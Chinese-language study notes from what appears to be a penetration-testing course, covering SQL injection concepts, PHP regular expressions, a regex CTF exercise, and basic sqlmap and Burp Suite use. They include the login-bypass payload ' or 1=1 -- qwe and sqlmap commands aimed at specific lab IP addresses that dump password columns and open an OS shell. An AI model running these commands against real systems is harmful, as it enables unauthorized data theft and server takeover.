---
{"dg-publish":true,"dg-正则表达式":true,"permalink":"/home/正则表达式/","dgPassFrontmatter":true}
---


# 一、初始SQL注入

	sql 注入：

   把用户输入的数据被当做数据库代码进行执行

数据库代码 => mysql 代码 select SQL语句

渗透测试 的命脉就是传参

## 什么是注入

	注入攻击的本质，是把用户输入的数据当作代码执行。

这里有两个关键条件：

第一是用户能够控制输入
第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行

那什么是SQL注入，就是针对sql语句的注入，也可以理解为用户输入的数据当做SQL语句的代码执行了 SQL注入是1998年一名叫做如rfp的黑客发表的一篇文章所进入大众视线的

如何防护？现在常用的防护软件主流核心就是

通过正则来过滤传参

过滤 => 把脏的东西过滤掉(规则)

   计算机中的过滤是人设定的规则
   
a' Or 1 = 1 --qwe  123
'  Or 1=1  --qwe 

```php
$email = 'yuxiaoxiao@example.com';
$domain = strstr($email,'@');
echo $domain; //打印@example.com
$user=strstr($email,'@',true);//从PHP5.3.0起
echo $user; //打印 yuxiaoxio
```
如果字符串最后为0 ，可以用strlen 显示出来。
案例
```php  
<?php 
$a = strstr('yuxiaoxiao@example.com0','0');
var_dump($a);
if(strlen($a)){echo 'ok';}
//判断字符串的长度，就不会受到0干扰
?> 
```


# 二、什么是正则表达式

🍆正则表达式，又称规则表达式。计算机科学的一个概念。正则表达式通常被用来检索、替换哪些符号某个模式(规则)的文本。

## 🍇正则表达式的特点是：
- 1.灵活性、逻辑性和功能性非常强；
- 2.可以迅速地用级简单的方式达到字符串的复杂控制。
- 3.对于刚接触的人来说，比较晦涩难懂。

🍆正则表达式用途：

- 判断字符串是否符合某一规则 （判断是否符号手机号、邮箱规则）。
- 从一个字符串找到符合规则的所有字符串(取HTML标签名)。



# 三、PHP中正则表达式常用函数

🍇PHP 中使用正则一定要加代表正则的标识  // 

🥑preg_match_all(正则表达式,匹配字符串,匹配到的东西放到数组)
 🥑 返回匹配到的次数

🌶️preg_replace (正则表达式,替换成什么,匹配字符串)
 🌶️返回替换后的结果


替换支持数组格式

# 四、正则表达式语法- 字符

## 常用转义字符：

```
- 数字：\d
- 非数字：\D
- 空白字符（空格、制表符、换页符等）： \s
- 非空白字符： \S
- 单词字符：（26个英文字母+数字+下划线_）: \w
- 非单词字符： \W


```

## 自定义字符结合

- 字符集合：[单个字符或字符区间]，用于匹配集合内字符

如：
 - [a-z]表示a-z这26个小写字母
 - [0-9a-z]表示0-9 这10个数字和a-z26个小写字母
 - [135a-h] 表示包含数字1，3，5和字母a-h这8个字母
 - 注意：两个不同字符段间请勿使用，隔开。
- 非集：[^单个字符或字符区间]，用于匹配非集合内字符。
	如：
-  【^0-9】示匹配所有非数字字符。
-  【^a-zA-z】表示匹配所有非字母字符。

计算机的本质是数字运算  大小写是有说法

2>1    10>5

ascii码： 将字符串变化为数字

##  正则表达式的语法 - 关键字

`（）=> 和数字一样很像，代表这是一个整体。

`^ => 匹配输入字符串的开始位置

`$ =>匹配输入字符串的结尾位置

`. => 通配符[代表任意字符]  [不匹配换行]

`* =>  匹配0次或者多次

`+  => 匹配1次或者多次

`\  => 转义字符

`|  => 两项之间的一个选择。

【^b-y】除了b-y的一切 （中口号里面的是取反）
【a-z】匹配a-z的一切

（）代表是一个整体 

`^ 匹配字符串的开头

`$  匹配结尾

`. 匹配一切  nf .09
```php
$a ='zkaq123123';
var_dump(preg_match_all('/(zkaq.+)|(bbs.+)/',$a,$b));
var_dump($b);

```

`* 匹配0次或者多次 

`+ 匹配1次或者多次   
 [[学习区(未掌握)/是连续的字符\|是连续的字符]]




[[学习区(未掌握)/限定开头，限定结尾就是字符长度\|限定开头，限定结尾就是字符长度]]

4*(5+3) = 4*8 =32 


## 正则表达式的语法 - 限定符 + 修饰符

限定符：{}

{n} => 例如：o{8} 意思是指只有连起来8个0才会被匹配

{n,} => 例如： o{2,} 意思是只要2个0及其以上的就会被匹配

{n,m} => 例如： o{2,4} 意思是最少匹配2个0，最多匹配4个0

注：被匹配时，默认匹配最多的次数
```php
$a ='9999';
var_dump(preg_match_all('/9{2,3}/',$a,$b));
var_dump($b);
//结果是
int(1) array(1) { [0]=> array(1) { [0]=> string(3) "999" } }
```

修饰符：

/i  => 不区分大小写
/A  => 匹配规则必须从头开始匹配
/s  => .将匹配一切字符
/x  => 正则表达式的空白字符会被忽略

[正则表达式案例](https://www.cnblogs.com/-run/articles/2371078.html)

练习 
```php
<?php    
$key='flag{********************************}'; 
$Regular= preg_match("/zkaq.*key.2,9}:\/.*\/(key*key)/i", trim($_GET["id"]), $match);   
if( $Regular ){    
  die('key: '.$key);   
}
```

分析 die是输出意思

代码if die 
要执行到die这里

结果

`preg_match("/zkaq.*key.{2,9}:\/.*\/(key*key)/i", trim($_GET["id"]), $match)

[[学习区(未掌握)/preg_match#^ba8839\|preg_match#^ba8839]]的语法意思是(匹配规则,匹配字符串,匹配返回的数组)


渗透测试常用工具

## 1. 环境安装（java|python） 
python语言运行的环境 sqlmap
java语言所用的环境 brup 
jre :运行环境
jdk: 开发环境

环境变量？

calc  cmd 其实本质都是exe程序

在执行命令的时候，他会去一些路径加载信息

SQLmap 自动化SQL注入工具

  sql注入 ：第一个漏洞[1998年的时候就提出]
 OWASP TOP 10 年度十佳漏洞（注入漏洞排第一）
榜首的是注入攻击 - （SQL注入攻击） 在真的项目中不常见

SQL ：结构化查询语2句  [数据库代码]
注入：  针管插入你的血管，往里面注射东西
		  把恶意的代码注入到原本的语句中
SQL注入：把恶意的代码注入到sql语句中 [恶意代码]

`"elect * from admin where username='$username' and password ='$password'";

$username 是用户的传参
$password是用户的传参
select * from admin where username=’admin‘ and password = '123456'

不知道别人密码的情况下如何登录别人账号？

万能密码(sql注入)
密码： ’ or 1=1 --qwe    （引号内是字符串，引号外是代码） 闭合
把原有的语句闭合掉，然后让后面运行自己写的恶意语句

select * from admin where usename=‘admin‘ and password = ' ' or 1=1 -- qwe'

and 两个条件都满足才可以

or 一个条件满足就行了

True and False or  True

False or True

得到结果了

-- 空格  // 注释 ，里面写的东西不是代码，他是对代码的解释
		空格写在传参末尾，非常容易被处理掉 -- qwe

SQL注入： 用户输入的数据当作了SQL代码进行执行 （SQL语句）

	-u "可能存在注入的地址" // 检测是否存在注入
			// boolean-based blind  布尔盲注
			// error-based  报错注入
			// time-based blind  时间盲注

库 表  字段 [数据]

	--dbs  查库  -D 指定库名
sqlmap.py -u "http://192.168.88.131/index.php?username=admin&password=%27+or+1%3D1+--+qwe%27&den=%B5%C7%C2%BD" --flush-session --dbs

	--tables 查表  -T 指定表
sqlmap.py -u "http://192.168.88.131/index.php?username=admin&passord=123456&den=%B5%C7%C2%BD" -D aadc --tables

	--colums  查字典 -C 指定字段
sqlmap.py -u "http://192.168.88.131/index.php?username=admin&passord=123456&den=%B5%C7%C2%BD" -D aadc -T admin --colums

	--dump 托数据[慎重]

sqlmap.py -u "http://192.168.88.131/index.php?username=admin&passord=123456&den=%B5%C7%C2%BD" -D aadc -T admin -C password --dump

	--delay=1   // 访问延迟，一秒一次 [ban  关小黑屋]

	 --flush-session   // sqlmap也会偷懒，只要跑过的数据，他会缓存，缓存之后就不跑了


	--os-shell  直接拿下目标服务器
  
http://rykm6453.ia.aqlab.cn/single.php?id=1

shutdown 关机 不要运行，因为关机了其他同学没法做了

工具是有局限性的，有的时候会不好用，因为工具不灵活。
mysql高于5.0的情况下有一个系统自带库，里面有很多对渗透有用的数据

>--technique  指定注入方式

	B: Boolean-based blind SQL injection（布尔型注入）  
	E: Error-based SQL injection（报错型注入）  
	U: UNION query SQL injection（可联合查询注入）  
	S: Stacked queries SQL injection（可多语句查询注入）  
	T: Time-based blind SQL injection（基于时间延迟注入）

burp: 通过数据包做渗透(抓包) 把你的数据包抓住

正常： 浏览器 -> 网站
抓包：浏览器 ->  burp  -> 网站

正常情况下数据包是不容易控制
burp 破解 ：https:www.zkaq.org/t/2371078.html 	

	1.抓包 
			监听着8080本地8080端口数据brup
			挂代理 => 浏览器把数据给你指定的地址
					1.挂系统代理
					2.挂浏览器代理
	2.跑包

弄到别人的包：嗅探、劫持（arp欺骗、DNS劫持）


知识点：

2. sqlmap的基础使用 (跑数据、 os-shell)    工具可以用但是不要依赖
3. burp的安装、证书的安装、浏览器的插件安装








5. Sqlmap的基础指令

Sqlmap 是用的最为广泛的自动化检测、利用SQL注入的渗透测试工具，支持多种数据库。


下载地址：https://github.com/sqlmapproject/sqlmap

sqlmap使用手册 [# Web渗透之Web利器合集——sqlmap使用手册](https://blog.csdn.net/Mr_Wanderer/article/details/107499792)

sqlmap 曾经土木人[sqlmap 曾经土木人](https://www.cnblogs.com/hongfei/p/3872156.html)

下载好后直接解压，并且加入环境变量，就可以直接在cmd调用

常用最基础指令：

-u 指定注入点

--dbs 跑库名

--tables 跑表名  

--columns 跑字段名

--dump 枚举数据(很危险，容易出事)

-D 指定库 -T 指定表 -C 指定字段

sqlmap.py -u http://59.63.200.79:8003/?id=1 -D maoshe -T admin -C

 password --dump

超详细Sqlmap指令手册：https://www.cnblogs.com/hongfei/p/3872156.html

常见指令：

 --random-agent 选择随机user-agents头 （系统，访问过快封Ip）

 --delay=1 每次探测延时1秒（防止访问过快被ban）

 --count 查看数据量

 --proxy "http://127.0.0.1:1080" 使用本地1080端口

 --level 1-5 测试等级（最低1，最高5） level等级越高检测越详细，例如 level大于2会检测cookie注入，大于3会检测头注入 --risk 2                       (--level 3 --risk 2) risk 测试更多的语句

 --is-dba       查询当前用户权限，如果DBA是True可以尝试直接拿webshell

 --os-shell 尝试往网站中放入一个cmdshell(就是拥有cmd权限的shell),先选择写入shell的脚本语言


1. Burpsuite工具的基础使用
2. 浏览器插件的安装




